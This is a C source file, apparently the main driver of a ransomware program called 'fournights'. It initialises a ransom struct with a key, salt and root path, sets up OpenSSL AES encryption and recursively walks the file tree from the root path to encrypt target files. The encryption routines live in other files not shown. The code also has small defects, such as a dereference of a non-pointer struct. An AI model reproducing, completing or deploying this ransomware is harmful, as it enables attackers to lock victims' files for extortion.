#include "fournights.h"
/**
  * sighandler - traps signals
  * @sig: Signal to trap
 **/
static void sighandler(int sig)
{
	if (sig == SIGINT)
	{
		write(1, "\nWTF?!\n", 7);
		exit(1);
	}
}


/**
  * main - Entry point
  * @ac: argument count
  * @av: argument vectors
  * Return: 0
  * TODO: need to eliminate hard coded strings.
 **/
int main(void)
{
	struct ransom_s ransom;
	EVP_CIPHER_CTX encrypt;

	/** handle signals
	  * TODO: Account for errors
	 **/
	signal(SIGINT, sighandler);

	init_struct(&ransom);
	aes_init((unsigned char *)ransom.key, my_strlen(ransom.key), (unsigned char *)&(ransom.salt), &encrypt);
	ransom.target_file_buf->encrypt = &encrypt;
#ifndef NO_DEBUG
	printf("%s\n", ransom.root_path);
	printf("About to enter recurse_ls fxn\n");
#endif
	recurse_ls((char *)ransom.root_path, &ransom);
	/* Crypto */
#ifndef NO_DEBUG
	print_for_debug(*ransom);
#endif
	EVP_CIPHER_CTX_cleanup(&encrypt);
	free_ransom_struct(&ransom);
	return (EXIT_SUCCESS);
}
